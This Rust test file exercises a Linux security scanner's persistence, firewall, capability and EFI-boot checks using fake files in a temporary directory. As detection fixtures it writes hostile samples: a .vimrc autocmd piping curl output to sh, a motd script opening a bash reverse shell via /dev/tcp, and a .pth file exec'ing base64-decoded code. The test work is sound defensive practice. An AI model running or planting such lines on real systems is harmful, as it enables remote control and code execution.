//! Python startup files, editor plugins, file-type handlers, login and rotation scripts,
//! proxies, triggers, files of no package, local packages, the firewall, boot files on the EFI
//! partition and rights of running programs. Made-up files in a temporary directory; nothing
//! on the real system is read or changed.

use scanner::baseline::{self, newly_tracked, Baseline};
use scanner::config::Config;
use scanner::finding::Finding;
use scanner::modules::desktop_session::xdg::mime_handlers;
use scanner::modules::firewall::read_ruleset;
use scanner::modules::persistence::editors::listed_extensions;
use scanner::modules::persistence::hooks::{listens_to_network, trigger_lines};
use scanner::modules::persistence::packages::{compare_versions, installed_packages, local_packages};
use scanner::modules::persistence::python::{pth_code, python_danger, usual_pth_line};
use scanner::modules::persistence::startup::{logrotate_scripts, proxy_settings};
use scanner::modules::procrights::dangerous_capabilities;
use scanner::modules::secrets::{is_proxy_variable, judge_proxy};
use scanner::report::Report;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::cmp::Ordering;
use std::collections::HashMap;
use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn program(root: &Path, abs: &str, content: &str) {
    write(root, abs, content);
    fs::set_permissions(root.join(abs.trim_start_matches('/')), fs::Permissions::from_mode(0o755)).expect("chmod");
}

fn link(root: &Path, abs: &str, target: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    symlink(target, p).expect("link");
}

fn md5(text: &str) -> String {
    use md5::{Digest, Md5};
    Md5::digest(text.as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
}

/// A package that ships these files exactly as given.
fn package(root: &Path, name: &str, files: &[(&str, &str)]) {
    let list: String = files.iter().map(|(p, _)| format!("{p}\n")).collect();
    let sums: String = files.iter().map(|(p, c)| format!("{}  {}\n", md5(c), p.trim_start_matches('/'))).collect();
    write(root, &format!("/var/lib/dpkg/info/{name}.list"), &list);
    write(root, &format!("/var/lib/dpkg/info/{name}.md5sums"), &sums);
}

fn scan(root: &Path, modules: &[ModuleId]) -> Report {
    let opts = ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() };
    run_scan(&SysRoot::new(root), &Config::default(), &opts, &|_| {})
}

fn of<'a>(report: &'a Report, rule: &str) -> Vec<&'a Finding> {
    report.findings.iter().filter(|f| f.rule == rule).collect()
}

fn levels(report: &Report, rule: &str) -> Vec<Severity> {
    let mut v: Vec<Severity> = of(report, rule).iter().map(|f| f.severity).collect();
    v.sort();
    v
}

fn fake_process(root: &Path, pid: u32, exe: &str, uids: &str, caps: &str) {
    let name = exe.rsplit('/').next().unwrap_or("p");
    write(root, &format!("/proc/{pid}/stat"), &format!("{pid} ({name}) S 1 1 1 0 -1 4194560 0 0\n"));
    write(root, &format!("/proc/{pid}/status"), &format!("Name:\t{name}\nPPid:\t1\nUid:\t{uids}\nCapEff:\t{caps}\n"));
    write(root, &format!("/proc/{pid}/cmdline"), name);
    link(root, &format!("/proc/{pid}/exe"), exe);
}

#[test]
fn python_startup_files() {
    assert_eq!(pth_code("/opt/lib\nimport os\n  import ignored\n"), vec!["import os"]);
    assert!(usual_pth_line("import os; os.environ.get('X') and __import__('_distutils_hack').add_shim()"));
    assert!(!usual_pth_line("import _distutils_hack; exec('x')"));
    assert!(python_danger("import socket").is_some() && python_danger("import sys").is_none());

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    package(root, "python3", &[("/usr/lib/python3/dist-packages/ok.pth", "import sys\n")]);
    write(root, "/usr/lib/python3/dist-packages/ok.pth", "import sys\n");
    write(root, "/home/anna/.local/lib/python3.13/site-packages/bad.pth", "import os; exec(__import__('base64').b64decode('x'))\n");
    write(root, "/home/anna/.local/lib/python3.13/site-packages/paths.pth", "/home/anna/src\n");
    write(root, "/home/anna/code/p/.venv/lib/python3.13/site-packages/_virtualenv.pth", "import _virtualenv\n");
    write(root, "/usr/local/lib/python3.13/dist-packages/sitecustomize.py", "# hello\nimport sys\n");
    let report = scan(root, &[ModuleId::Persistence]);
    assert_eq!(levels(&report, "PERS-PYTHON-STARTUP"), vec![Severity::Medium, Severity::High]);
    let recorded = &report.inventory.persistence_files;
    assert!(recorded.contains_key("/home/anna/code/p/.venv/lib/python3.13/site-packages/_virtualenv.pth"));
    assert!(!recorded.contains_key("/home/anna/.local/lib/python3.13/site-packages/paths.pth"));
}

#[test]
fn editors_and_the_programs_that_open_files() {
    let json = r#"[{"identifier":{"id":"pub.good"},"location":{"path":"/x/pub.good-1"},"metadata":{"source":"gallery"}},{"identifier":{"id":"pub.file"},"relativeLocation":"pub.file-1","metadata":{"source":"vsix"}}]"#;
    assert_eq!(listed_extensions(json).len(), 2);
    assert_eq!(mime_handlers("[Default Applications]\ntext/html=a.desktop;b.desktop;\n[Removed Associations]\ntext/plain=c.desktop;\n").len(), 2);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/usr/share/wayland-sessions/plasma.desktop", "");
    write(root, "/home/anna/.vimrc", "\" autocmd VimEnter * !curl http://198.51.100.7/x | sh\nset number\nautocmd VimEnter * silent !curl -s http://198.51.100.7/x | sh\n");
    write(root, "/home/anna/.config/nvim/init.lua", "vim.fn.system({'git', 'clone', 'https://github.com/x/y'})\n");
    let base = "/home/anna/.vscode/extensions";
    write(root, &format!("{base}/extensions.json"), &json.replace("/x/", &format!("{base}/")));
    for folder in ["pub.good-1", "pub.file-1", "hand.made-1"] {
        write(root, &format!("{base}/{folder}/package.json"), "{}");
    }
    write(root, "/home/anna/.config/mimeapps.list", "[Default Applications]\nx-scheme-handler/https=web.desktop;\nx-scheme-handler/app-login=login.desktop;\ntext/csv=calc.desktop;\n");
    write(root, "/home/anna/.local/share/applications/web.desktop", "[Desktop Entry]\nExec=/home/anna/bin/browser %u\n");
    write(root, "/home/anna/.local/share/applications/login.desktop", "[Desktop Entry]\nExec=/usr/bin/true %u\n");
    write(root, "/usr/share/applications/calc.desktop", "[Desktop Entry]\nExec=/usr/bin/calc %u\n");
    let report = scan(root, &[ModuleId::Persistence, ModuleId::DesktopSession]);
    assert_eq!(levels(&report, "PERS-EDITOR-SCRIPT"), vec![Severity::High]);
    let extensions = of(&report, "PERS-EDITOR-EXTENSION");
    assert_eq!(extensions[0].severity, Severity::Low);
    assert!(extensions[0].evidence.contains("pub.file") && extensions[0].evidence.contains("hand.made-1") && !extensions[0].evidence.contains("pub.good"));
    let handlers = of(&report, "PERS-MIME-HANDLER");
    assert_eq!(handlers.len(), 1);
    assert_eq!(handlers[0].severity, Severity::Medium);
    assert!(handlers[0].evidence.contains("web.desktop") && handlers[0].evidence.contains("login.desktop") && !handlers[0].evidence.contains("calc.desktop"));

    write(root, &format!("{base}/extensions.json"), r#"[{"identifier":{"id":"new.one"},"metadata":{"source":"gallery"}}]"#);
    let after = scan(root, &[ModuleId::Persistence]);
    let (changes, _) = baseline::compare(&Baseline::from_report(&report), &after.inventory, &after.modules);
    assert!(changes.iter().any(|f| f.rule == "BASE-EDITOR-NEW" && f.title.ends_with("new.one")));
}

#[test]
fn login_rotation_proxies_and_triggers() {
    assert_eq!(logrotate_scripts("/var/log/x {\n  postrotate\n    kill -HUP 1\n  endscript\n  weekly\n}\n"), vec!["kill -HUP 1"]);
    assert_eq!(proxy_settings("/etc/wgetrc", "#https_proxy = http://example.org\nhttp_proxy = http://p:3128\n").len(), 1);
    assert_eq!(proxy_settings("/h/.curlrc", "--proxy http://p:1\nsilent\n").len(), 1);
    assert_eq!(proxy_settings("/h/.gitconfig", "[core]\nproxy=x\n[http]\nproxy = http://p:1\n").len(), 1);
    assert!(is_proxy_variable("HTTPS_PROXY") && !is_proxy_variable("NO_PROXY"));
    assert_eq!(judge_proxy("http://127.0.0.1:8080"), Severity::Low);
    assert_eq!(judge_proxy("http://u:p@198.51.100.7:3128/"), Severity::Medium);
    let triggers = trigger_lines("[Unit]\nDescription=x\n[Socket]\nListenStream=4444\nAccept=yes\n");
    assert_eq!(triggers, vec!["ListenStream=4444", "Accept=yes"]);
    assert!(listens_to_network(&triggers) && !listens_to_network(&["ListenStream=/run/x.sock".to_string()]));

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    package(root, "base", &[("/etc/update-motd.d/10-uname", "#!/bin/sh\nuname\n"), ("/etc/logrotate.d/ok", "x {\npostrotate\n true\nendscript\n}\n")]);
    program(root, "/etc/update-motd.d/10-uname", "#!/bin/sh\nuname\n");
    write(root, "/etc/logrotate.d/ok", "x {\npostrotate\n true\nendscript\n}\n");
    program(root, "/etc/update-motd.d/99-x", "#!/bin/sh\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n");
    write(root, "/etc/logrotate.d/own", "y {\nprerotate\n /usr/local/bin/tidy\nendscript\n}\n");
    write(root, "/etc/ssh/sshrc", "echo hello\n");
    write(root, "/etc/environment", "https_proxy=http://anna:topsecret@198.51.100.9:3128\n");
    write(root, "/home/anna/.curlrc", "proxy = http://127.0.0.1:8080\n");
    write(root, "/home/anna/net/auto.pac", "function FindProxyForURL(url, host) { return 'DIRECT'; }\n");
    write(root, "/etc/systemd/system/watch.path", "[Path]\nPathChanged=/etc/passwd\nUnit=watch.service\n[Install]\nWantedBy=multi-user.target\n");
    link(root, "/etc/systemd/system/multi-user.target.wants/watch.path", "/etc/systemd/system/watch.path");
    write(root, "/run/systemd/transient/run-1.socket", "[Socket]\nListenStream=4444\n");
    let report = scan(root, &[ModuleId::Persistence]);
    assert_eq!(levels(&report, "PERS-MOTD"), vec![Severity::Critical]);
    assert_eq!(levels(&report, "PERS-LOGROTATE"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "PERS-SSH-RC"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "PERS-ENV-PROXY"), vec![Severity::Low, Severity::Medium]);
    assert!(!serde_json::to_string(&report).expect("json").contains("topsecret"));
    assert_eq!(levels(&report, "PERS-PAC-FILE"), vec![Severity::Low]);
    let local = of(&report, "PERS-SYSTEMD-LOCAL");
    assert!(local.iter().any(|f| f.severity == Severity::Medium && f.title.contains("path trigger") && f.evidence.contains("PathChanged=/etc/passwd")), "{local:?}");
    assert_eq!(levels(&report, "PERS-TRIGGER-UNIT"), vec![Severity::Medium]);
}

#[test]
fn files_of_no_package_and_local_packages() {
    assert_eq!(compare_versions("1:1.0", "2.0"), Ordering::Greater);
    assert_eq!(compare_versions("1.0~rc1-1", "1.0-1"), Ordering::Less);
    assert_eq!(compare_versions("9.2p1-2+deb13u10", "9.2p1-2+deb13u9"), Ordering::Greater);
    assert_eq!(compare_versions("1.10-1", "1.9-1"), Ordering::Greater);
    assert_eq!(compare_versions("2.0-1", "2.0-1"), Ordering::Equal);
    let status = "Package: dpkg\nStatus: install ok installed\nVersion: 1.22\n\nPackage: own\nStatus: install ok installed\nMaintainer: x\nVersion: 1\n\nPackage: sudo\nStatus: install ok installed\nVersion: 9.9\n\nPackage: gone\nStatus: deinstall ok config-files\nVersion: 1\n\nPackage: linux-image-1\nStatus: install ok installed\nMaintainer: Debian Kernel Team <x@lists.debian.org>\nVersion: 1\n\nPackage: waiting\nStatus: install ok installed\nVersion: 1.0\n";
    let installed = installed_packages(status);
    assert_eq!(installed.len(), 5);
    let offered: HashMap<String, Vec<String>> = [("dpkg", "1.22"), ("sudo", "9.5"), ("waiting", "1.1")].iter().map(|(n, v)| (n.to_string(), vec![v.to_string()])).collect();
    let (unknown, newer, kernels) = local_packages(&installed, &offered);
    assert_eq!(unknown.iter().map(|p| p.name.as_str()).collect::<Vec<_>>(), vec!["own"]);
    assert_eq!(newer.iter().map(|p| p.0.name.as_str()).collect::<Vec<_>>(), vec!["sudo"]);
    assert_eq!(kernels, vec!["linux-image-1"]);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/var/lib/dpkg/status", status);
    write(root, "/var/lib/apt/lists/deb.debian.org_dists_trixie_main_binary-amd64_Packages", "Package: dpkg\nVersion: 1.22\n\nPackage: sudo\nVersion: 9.5\n\nPackage: waiting\nVersion: 1.1\n");
    package(root, "libc", &[("/usr/lib/x86_64-linux-gnu/libc.so.6", "\u{7f}ELFlibc"), ("/usr/lib/cups/backend-available/lpd", "backend")]);
    program(root, "/usr/lib/x86_64-linux-gnu/libc.so.6", "\u{7f}ELFlibc");
    // a copy a package makes when it is installed
    program(root, "/usr/lib/cups/backend/lpd", "backend");
    // two names for the same copy: both are explained
    program(root, "/usr/lib/cups/backend/mdns", "backend");
    write(root, "/usr/lib/x86_64-linux-gnu/libevil.so", "\u{7f}ELFevil");
    write(root, "/usr/lib/x86_64-linux-gnu/security/pam_x.so", "\u{7f}ELFpam");
    write(root, "/usr/lib/data/notes.txt", "text");
    program(root, "/usr/lib/modules/6.1/updates/x.sh", "dkms");
    write(root, "/etc/systemd/system/mnt-data.mount", "[Mount]\nWhat=x\n");
    let report = scan(root, &[ModuleId::Persistence]);
    assert_eq!(levels(&report, "PERS-UNOWNED-LIB"), vec![Severity::Medium, Severity::High]);
    let text: String = of(&report, "PERS-UNOWNED-LIB").iter().map(|f| f.evidence.clone()).collect();
    assert!(text.contains("libevil.so") && text.contains("pam_x.so") && !text.contains("lpd") && !text.contains("mdns") && !text.contains("notes.txt") && !text.contains("modules"), "{text}");
    assert_eq!(levels(&report, "PERS-UNOWNED-SYSTEM"), vec![Severity::Low]);
    assert_eq!(levels(&report, "PERS-LOCAL-PACKAGE"), vec![Severity::Low]);
    assert_eq!(levels(&report, "PERS-PKG-NEWER"), vec![Severity::Medium]);
    write(root, "/var/lib/dpkg/status", &format!("{status}\nPackage: planted\nStatus: install ok installed\nVersion: 1\n"));
    let after = scan(root, &[ModuleId::Persistence]);
    let (changes, _) = baseline::compare(&Baseline::from_report(&report), &after.inventory, &after.modules);
    assert_eq!(changes.iter().filter(|f| f.rule == "BASE-LOCAL-PACKAGE").count(), 1);
}

#[test]
fn firewall_and_rights_of_programs() {
    // nftables.conf as Debian ships it: chains without any rule
    let empty = "table inet filter {\n chain input {\n  type filter hook input priority filter;\n }\n}\n";
    assert!(!read_ruleset(empty).protects);
    let ufw = "table ip filter {\n chain INPUT {\n  type filter hook input priority filter; policy drop;\n  counter packets 1 bytes 2 jump ufw-before-input\n }\n chain ufw-user-input {\n  ip saddr 203.0.113.5 counter packets 0 bytes 0 accept\n  ip saddr 192.168.1.5 accept\n  tcp dport 22 ip saddr 203.0.113.9 accept\n }\n}\n";
    let rules = read_ruleset(ufw);
    assert!(rules.protects);
    assert_eq!(rules.public_allows, vec!["chain ufw-user-input: ip saddr 203.0.113.5 accept"]);
    // anti-spoofing drops and forwarding rules are no protection
    let vpn = "table ip filter {\n chain INPUT {\n  type filter hook input priority filter; policy accept;\n }\n chain ts-input {\n  ip saddr 100.64.0.0/10 counter drop\n }\n chain FORWARD {\n  type filter hook forward priority filter; policy drop;\n  reject\n }\n}\n";
    assert!(!read_ruleset(vpn).protects);
    assert!(read_ruleset("table inet x {\n chain input {\n  type filter hook input priority 0;\n  tcp dport 22 accept\n  counter packets 3 bytes 4 reject\n }\n}\n").protects);
    assert_eq!(dangerous_capabilities(0x3400), vec!["net_admin", "net_raw"]);
    assert!(dangerous_capabilities(1 << 23 | 1 << 35).is_empty());

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/ufw/ufw.conf", "ENABLED=yes\n");
    fake_process(root, 10, "/usr/sbin/dnsmasq", "65534 65534 65534 65534", "0000000000003400");
    fake_process(root, 11, "/home/anna/.cache/x", "1000 1000 1000 1000", "0000000000200000");
    // set-uid to root: every right is expected
    fake_process(root, 12, "/usr/bin/fusermount3", "1000 0 0 0", "000001ffffffffff");
    fake_process(root, 13, "/usr/bin/python3", "1000 1000 1000 1000", "0000000000000080");
    fake_process(root, 14, "/usr/bin/some-daemon", "100 100 100 100", "0000000000000004");
    let before = scan(root, &[ModuleId::NetProc, ModuleId::ProcAudit]);
    assert!(of(&before, "NET-NO-FIREWALL").is_empty());
    assert_eq!(levels(&before, "PROC-CAPABILITIES"), vec![Severity::Low, Severity::High, Severity::High]);
    write(root, "/etc/ufw/ufw.conf", "ENABLED=no\n");
    let after = scan(root, &[ModuleId::NetProc]);
    assert_eq!(levels(&after, "NET-NO-FIREWALL"), vec![Severity::Low]);
    let (changes, _) = baseline::compare(&Baseline::from_report(&before), &after.inventory, &after.modules);
    assert!(changes.iter().any(|f| f.rule == "BASE-FIREWALL-OFF"));
}

#[test]
fn boot_files_on_the_efi_partition() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    for (name, content) in [("shimx64", "shim"), ("mmx64", "mm"), ("fbx64", "fb")] {
        write(root, &format!("/usr/lib/shim/{name}.efi.signed"), content);
    }
    write(root, "/usr/lib/grub/x86_64-efi-signed/grubx64.efi.signed", "grub");
    std::thread::sleep(std::time::Duration::from_millis(30));
    write(root, "/boot/efi/EFI/debian/shimx64.efi", "shim");
    write(root, "/boot/efi/EFI/debian/grubx64.efi", "implant");
    write(root, "/boot/efi/EFI/debian/fwupdx64.efi", "firmware");
    write(root, "/boot/efi/EFI/BOOT/bootx64.efi", "old grub");
    let report = scan(root, &[ModuleId::Integrity]);
    assert_eq!(levels(&report, "INT-EFI-FILE"), vec![Severity::Info, Severity::Low, Severity::High]);
    let high = of(&report, "INT-EFI-FILE").into_iter().find(|f| f.severity == Severity::High).expect("high");
    assert!(high.evidence.contains("grubx64.efi") && !high.evidence.contains("debian/shimx64.efi"));
}

#[test]
fn new_kinds_are_newly_tracked() {
    for path in [
        "/home/anna/.local/lib/python3.13/site-packages/x.pth", "/usr/local/lib/python3.13/dist-packages/sitecustomize.py", "/home/anna/.vimrc",
        "/home/anna/.config/nvim/init.lua", "/home/anna/.config/mimeapps.list", "/etc/update-motd.d/99", "/etc/logrotate.d/x", "/etc/ufw/user.rules",
        "/home/anna/.curlrc", "/etc/wgetrc", "/home/anna/a.pac", "/etc/systemd/system/mnt-data.mount",
    ] {
        assert!(newly_tracked(path), "{path}");
    }
    assert!(!newly_tracked("/etc/systemd/system/watch.path") && !newly_tracked("/etc/systemd/system/x.socket"));
}
